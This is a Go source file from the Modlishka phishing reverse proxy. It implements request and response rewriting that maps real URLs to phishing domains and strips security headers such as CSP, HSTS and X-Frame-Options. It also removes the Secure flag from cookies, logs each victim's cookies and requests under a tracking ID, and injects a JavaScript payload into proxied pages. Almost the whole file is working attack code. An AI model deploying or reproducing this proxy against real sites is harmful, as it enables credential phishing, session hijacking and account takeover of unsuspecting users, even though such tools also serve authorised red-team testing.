/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package core

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"crypto/tls"
	"fmt"
	"github.com/drk1wi/Modlishka/config"
	"github.com/drk1wi/Modlishka/log"
	"github.com/drk1wi/Modlishka/plugin"
	"github.com/drk1wi/Modlishka/runtime"
	"io"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/dsnet/compress/brotli"
)

type ReverseProxy struct {
	Target         *url.URL               // target url after going through reverse proxy
	OriginalTarget string                 // target host before going through reverse proxy
	Origin         string                 // origin before going through reverse proxy
	IP             string                 // client ip addr
	Payload        string                 // JS payload that should be injected
	Terminate      bool                   // indicates whether this client should be released/terminated
	Proxy          *httputil.ReverseProxy // instance of Go ReverseProxy that will proxy requests/responses
	Config         *config.Options
	IsTLS          bool
	RequestContext  *plugin.HTTPContext
}

type ReverseProxyFactorySettings struct {
	config.Options
	target         string
	originaltarget string
	origin         string
	IsTLS 		   bool
}

type HTTPResponse struct {
	*http.Response
}

type HTTPRequest struct {
	*http.Request
}

func (p *ReverseProxy) rewriteResponse(r *http.Response) (err error) {
	defer log.FunctionTracking(time.Now(), "rewriteResponse")

	response := HTTPResponse{r}
	response.PatchHeaders(p)

	if !runtime.IsValidMediaType(response.Header.Get("Content-Type")) {
		return
	}

	// Decompress, if compressed, the HTTP Response before processing
	buffer, err := response.Decompress()
	if err != nil {
		log.Errorf("%+v", err)
		return
	}

	log.Debugf("[rw] Rewriting Response Body for (%+v): status[%d] type[%+v] encoding[%+v] uncompressedBody[%d bytes]",
		p.Target, response.StatusCode, response.Header.Get("Content-Type"),
		response.Header.Get("Content-Encoding"), len(buffer))

	// Translate URLs
	buffer = p.PatchURL(buffer)

	// Inject Payloads
	buffer = p.InjectPayloads(buffer)

	log.Cookies(p.RequestContext.UserID, p.Target.String(), response.Header["Set-Cookie"], p.IP)

	p.RequestContext.InvokeHTTPResponseHooks(response.Response, &buffer)

	// Compress the HTTP Response and update the HTTP Headers
	response.Compress(buffer)

	return
}

func (p *ReverseProxy) rewriteRequest(r *http.Request) (err error) {
	defer log.FunctionTracking(time.Now(), "rewriteRequest")

	request := HTTPRequest{r}
	request.PatchHeaders(p)
	request.PatchQueryString()

	p.RequestContext.OriginalTarget = p.OriginalTarget
	p.RequestContext.IP = p.IP
	p.RequestContext.IsTLS = p.IsTLS
	p.RequestContext.Target = p.Target
	p.RequestContext.Origin = p.Origin

	p.RequestContext.InvokeHTTPRequestHooks(request.Request)


	log.HTTPRequest(request.Request, p.RequestContext.UserID)

	// Handle HTTP Body (POST)
	if r.Body != nil {
		reader := r.Body
		buffer, err := io.ReadAll(reader)
		if err != nil {
			return err
		}

		buffer = []byte(runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(string(buffer), runtime.PhishURLToRealURL))

		request.Body = io.NopCloser(bytes.NewReader(buffer))
		request.ContentLength = int64(len(buffer))
		request.Header.Set("Content-Length", strconv.Itoa(len(buffer)))

		err = reader.Close()
		if err != nil {
			return err
		}

		err = r.Body.Close()
		if err != nil {
			return err
		}
	}

	return
}

func (httpRequest *HTTPRequest) PatchHeaders(p *ReverseProxy) {

	defer log.FunctionTracking(time.Now(), "PatchHeaders: HTTPRequest")

	httpRequest.Host = httpRequest.URL.Host

	// Patch HTTP Origin:
	origin := ""
	if p.Origin != "" {
		origin = runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(p.Origin, runtime.PhishURLToRealURL)

		if origin != "" {
			log.Debugf("Patching request Origin [%s] -> [%s]", p.Origin, origin)
			httpRequest.Header.Set("Origin", origin)
		}
	}

	// Patch HTTP Referer:
	// Prevent phish domain leakage via referer
	if httpRequest.Referer() != "" {
		newReferer := runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(httpRequest.Referer(), runtime.PhishURLToRealURL)
		httpRequest.Header.Set("Referer", newReferer)

		log.Debugf("Patching request Referer [%s] -> [%s]", httpRequest.Referer(), newReferer)
	}

	// Patch Cookies:
	// Prevent phish domain leakage via cookies
	if httpRequest.Header.Get("Cookie") != "" {
		cookie := runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(httpRequest.Header.Get("Cookie"), runtime.PhishURLToRealURL)
		if runtime.TrackingCookie != "" {
			cookie = runtime.RegexpCookieTracking.ReplaceAllString(cookie, "")
		}
		log.Debugf("Patching request Cookies [%s] -> [%s]", httpRequest.Header.Get("Cookie"), cookie)
		httpRequest.Header.Set("Cookie", cookie)

	}

	return
}

func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {

	defer log.FunctionTracking(time.Now(), "PatchHeaders: HTTPResponse")

	// Patch HTTP Origin:
	if p.Origin != "" {
		if httpResponse.Header.Get("Access-Control-Allow-Origin") == "*" {
			p.Origin = "*"
		}

		httpResponse.Header.Set("Access-Control-Allow-Origin", p.Origin)
		httpResponse.Header.Set("Access-Control-Allow-Credentials", "true")

		log.Debugf("[rw] Patching Response Origin [%s] -> [%s]", httpResponse.Header.Get("Access-Control-Allow-Origin"), p.Origin)
	}

	// Strip security HTTP headers
	var SECURITY = []string{
		"Content-Security-Policy",
		"Content-Security-Policy-Report-Only",
		"Strict-Transport-Security",
		"X-XSS-Protection",
		"X-Content-Type-Options",
		"X-Frame-Options",
	}
	for _, header := range SECURITY {
		httpResponse.Header.Del(header)
	}

	// Patch Cookies:
	// Prevent phish domain leakage via cookies
	if len(httpResponse.Header["Set-Cookie"]) > 0 {
		log.Cookies(p.RequestContext.UserID, p.Target.String(), httpResponse.Header["Set-Cookie"], p.IP)

		for i, v := range httpResponse.Header["Set-Cookie"] {
			//strip out the secure Flag
			r := strings.NewReplacer("Secure", "", "secure", "")
			cookie := r.Replace(v)
			cookie = runtime.RegexpFindSetCookie.ReplaceAllStringFunc(cookie, runtime.TranslateSetCookie)
			log.Debugf("Rewriting Set-Cookie Flags: from \n[%s]\n --> \n[%s]\n", httpResponse.Header["Set-Cookie"][i], cookie)
			httpResponse.Header["Set-Cookie"][i] = cookie
		}
	}

	if p.RequestContext.InitUserID != "" {
		// Add tracking cookie
		value := runtime.TrackingCookie + "=" + p.RequestContext.InitUserID +
			";Path=/;Domain=." + runtime.ProxyDomain +
			";Expires=Sat, 26-Oct-2025 18:54:56 GMT;Priority=HIGH"
		httpResponse.Header.Add("Set-Cookie", value)
	}

	if p.Terminate {
		log.Infof("Terminating session for %s", p.RequestContext.UserID)
		p.RequestContext.InvokeTerminateUserHooks(p.RequestContext.UserID)

		// Set Terminator Cookie
		value := runtime.TERMINATE_SESSION_COOKIE_NAME + "=" + runtime.TERMINATE_SESSION_COOKIE_VALUE +
			";Path=/;Domain=." + runtime.ProxyDomain +
			";Expires=Sat, 26-Oct-2025 18:54:56 GMT;HttpOnly;Priority=HIGH"
		httpResponse.Header.Add("Set-Cookie", value)
	}

	// Patch WWW-Authenticate:
	if len(httpResponse.Header["WWW-Authenticate"]) > 0 {
		oldAuth := httpResponse.Header.Get("WWW-Authenticate")
		newAuth := runtime.RegexpUrl.ReplaceAllStringFunc(oldAuth, runtime.RealURLtoPhish)

		log.Debugf("Rewriting WWW-Authenticate: from \n[%s]\n --> \n[%s]\n", oldAuth, newAuth)
		httpResponse.Header.Set("WWW-Authenticate", newAuth)
	}

	//handle 302
	if httpResponse.Header.Get("Location") != "" {
		oldLocation := httpResponse.Header.Get("Location")
		newLocation := runtime.RegexpUrl.ReplaceAllStringFunc(string(oldLocation), runtime.RealURLtoPhish)

		if runtime.ForceHTTPS == true {
			newLocation = strings.Replace(newLocation, "http://", "https://", -1)
		} else if runtime.ForceHTTP == true {
			newLocation = strings.Replace(newLocation, "https://", "http://", -1)
		}

		if len(runtime.TargetResources) > 0 {
			for _, res := range runtime.TargetResources {
				newLocation = strings.Replace(newLocation, res, runtime.RealURLtoPhish(res), -1)
			}
		}

		log.Debugf("Rewriting Location Header [%s] to [%s]", oldLocation, newLocation)
		httpResponse.Header.Set("Location", newLocation)
	}

	return
}

func (httpRequest *HTTPRequest) PatchQueryString() {

	queryString := httpRequest.URL.Query()
	if len(queryString) > 0 {
		var qParams []string
		for key := range httpRequest.URL.Query() {
			//fmt.Println(queryString[key])
			for i, v := range queryString[key] {
				qParams = append(qParams, fmt.Sprintf("%s = %s", key, v))
				queryString[key][i] = runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(v, runtime.PhishURLToRealURL)
			}
		}

		//Prevent leakage of the tracking parameter
		delete(queryString, runtime.TrackingParam)
		httpRequest.URL.RawQuery = queryString.Encode()
	}

	return
}

func (httpResponse *HTTPResponse) Decompress() (buffer []byte, err error) {

	body := httpResponse.Body
	compression := httpResponse.Header.Get("Content-Encoding")

	var reader io.ReadCloser

	switch compression {
	case "x-gzip":
		log.Debugf("X-Gzip, fallthrough gzip")
		fallthrough
	case "gzip":
		// A format using the Lempel-Ziv coding (LZ77), with a 32-bit CRC.
		// This is the original format of the UNIX gzip program.
		// The HTTP/1.1 standard also recommends that the servers supporting this content-encoding should recognize
		// x-gzip as an alias, for compatibility purposes.

		reader, err = gzip.NewReader(body)
		if err != io.EOF {
			buffer, _ = io.ReadAll(reader)
			defer reader.Close()
		} else {
			// Unset error
			err = nil
		}

	case "deflate":
		// Using the zlib structure (defined in RFC 1950) with the deflate compression algorithm (defined in RFC 1951).

		reader = flate.NewReader(body)
		buffer, _ = io.ReadAll(reader)
		defer reader.Close()

	case "br":
		// A format using the Brotli algorithm.

		c := brotli.ReaderConfig{}
		reader, err = brotli.NewReader(body, &c)
		buffer, _ = io.ReadAll(reader)
		defer reader.Close()

	case "compress":
		// Unhandled: Fallback to default

		// A format using the Lempel-Ziv-Welch (LZW) algorithm.
		// The value name was taken from the UNIX compress program, which implemented this algorithm.
		// Like the compress program, which has disappeared from most UNIX distributions,
		// this content-encoding is not used by many browsers today, partly because of a patent issue (it expired in 2003).
		log.Debugf("compress, fallthrough default")
		fallthrough

	default:
		log.Debugf("Fallback to default compression (%s)", compression)

		reader = body
		buffer, err = io.ReadAll(reader)
		if err != nil {
			return nil, err
		}
		defer reader.Close()
	}

	return
}

func (httpResponse *HTTPResponse) Compress(buffer []byte) {

	compression := httpResponse.Header.Get("Content-Encoding")
	switch compression {
	case "x-gzip":
		fallthrough
	case "gzip":
		buffer = gzipBuffer(buffer)

	case "deflate":
		buffer = deflateBuffer(buffer)

	case "br":
		// Brotli writer is not available just compress with something else
		httpResponse.Header.Set("Content-Encoding", "deflate")
		buffer = deflateBuffer(buffer)

	default:
		// Whatif?
	}

	body := io.NopCloser(bytes.NewReader(buffer))
	httpResponse.Body = body
	httpResponse.ContentLength = int64(len(buffer))
	httpResponse.Header.Set("Content-Length", strconv.Itoa(len(buffer)))

	err := httpResponse.Body.Close()
	if err != nil {
		log.Debugf("%s", err.Error())
	}
}

func (p *ReverseProxy) InjectPayloads(buffer []byte) []byte {

	if len(buffer) > 0 && p.Payload != "" {
		log.Debugf(" -- Injecting JS Payload [%s] \n", p.Payload)
		buffer = bytes.Replace(buffer, []byte("</body>"), []byte("<script>"+p.Payload+"</script></body>"), 1)
	}

	return buffer

}

func (p *ReverseProxy) PatchURL(buffer []byte) []byte {


	// Translate URLs
	buffer = []byte(runtime.RegexpUrl.ReplaceAllStringFunc(string(buffer), runtime.RealURLtoPhish))

	if len(runtime.ReplaceStrings) > 0 {
		for key, value := range runtime.ReplaceStrings {
			buffer = bytes.Replace(buffer, []byte(key), []byte(value), -1)
		}
	}


	if runtime.ForceHTTPS == true {
		buffer = bytes.Replace(buffer, []byte("http://"), []byte("https://"), -1)
	}

	if runtime.ForceHTTP == true {
		buffer = bytes.Replace(buffer, []byte("https://"), []byte("http://"), -1)
	}

	if len(runtime.TargetResources) > 0 {
		for _, res := range runtime.TargetResources {
			buffer = bytes.Replace(buffer, []byte(res), []byte(runtime.RealURLtoPhish(res)), -1)
		}
	}



	return buffer
}

// ReverseProxy factory
func (s *ReverseProxyFactorySettings) NewReverseProxy() *ReverseProxy {

	targetURL, _ := url.Parse(s.target)

	rp := &ReverseProxy{
		Target:         targetURL,
		Origin:         s.origin,
		Proxy:          httputil.NewSingleHostReverseProxy(targetURL),
		Config:         &s.Options,
		IsTLS:          s.IsTLS,
		OriginalTarget: s.originaltarget,
		RequestContext:  &plugin.HTTPContext{
			Extra:     make(map[string]string),
		},
	}



	transport := &http.Transport{

		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			Renegotiation: tls.RenegotiateFreelyAsClient,
		},
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 10 * time.Second,
		}).DialContext,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: 10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		IdleConnTimeout:       5 * time.Second,
	}

	if runtime.ProxyAddress != "" {
		urlProxy, _ := url.Parse(runtime.ProxyAddress)
		transport.Proxy = http.ProxyURL(urlProxy)
	}

	// Ignoring invalid target certificates
	rp.Proxy.Transport = transport

	// Handling: Request
	director := rp.Proxy.Director
	rp.Proxy.Director = func(req *http.Request) {
		rp.IP = req.RemoteAddr
		err := rp.rewriteRequest(req)
		if err != nil {
			log.Warningf("Director rewriteRequest error %s", err.Error())
		}
		director(req)
	}

	rp.Proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
		log.Debugf("[Proxy error][Error: %s]", err.Error())
	}


	// Handling: Response
	rp.Proxy.ModifyResponse = rp.rewriteResponse

	return rp
}
